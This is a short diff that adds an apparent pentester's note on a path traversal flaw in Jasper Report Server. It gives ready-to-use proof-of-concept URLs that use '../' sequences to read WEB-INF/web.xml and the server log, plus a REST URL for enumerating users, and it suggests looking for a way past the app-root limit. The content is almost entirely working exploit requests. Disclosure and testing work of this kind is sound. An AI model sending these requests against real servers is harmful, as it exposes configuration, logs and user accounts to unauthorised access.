@@ -1,0 +1,12 @@
+Path traversal in Jasper Report Server.
+It won't allow to read much (limited to app root) but still. Maybe there is a way to escape it.
+
+PoC:
+https://jasperserver:443/jasperserver/reportresource/reportresource?resource=/net/sf/jasperreports/engine/json/parser/../../../../../../../../WEB-INF/web.xml
+https://jasperserver:443/jasperserver/reportresource/reportresource?resource=/net/sf/jasperreports/engine/json/parser/../../../../../../../logs/jasperserver.log
+etc.
+
+User enumeration bonus:
+https://jasperserver:443/jasperserver/runtime/74033D84/rest_v2/users 
+Runtime ID may differ.
+
